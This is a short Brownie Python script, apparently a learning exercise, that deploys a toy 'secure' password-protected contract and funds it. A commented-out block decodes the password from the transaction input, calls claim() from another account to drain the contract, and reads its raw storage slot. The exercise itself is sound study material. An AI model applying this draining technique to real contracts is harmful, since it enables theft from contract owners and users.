from brownie import secure, web3, config, accounts


def securityBank():
    c = secure.deploy({'from': accounts[0]})
    accounts[0].transfer(c.address, 10 * 10**18)
    tx = c.setPassword(123445, {'from': accounts[0]})
    tx.wait(1)
    return c, tx


def main():
    c, tx = securityBank()
    # Suponiendo q obutve el hash de la tx de la cadena de blocques
    #trasnacttion = chain.get_transaction('0x7c62af664abf32c8187344d15ff809a447a53f197934c4e9e7f6e00558ed9840')
    '''transaction_data = c.decode_input(tx.input)
    password = transaction_data[1]
    stole = c.claim(password[0], {'from': accounts[9]})
    stole.wait(1)
    print("Balance victim:", c.balance())
    numero = web3.eth.get_storage_at(c.address, 0)
    print(web3.toInt(numero))'''
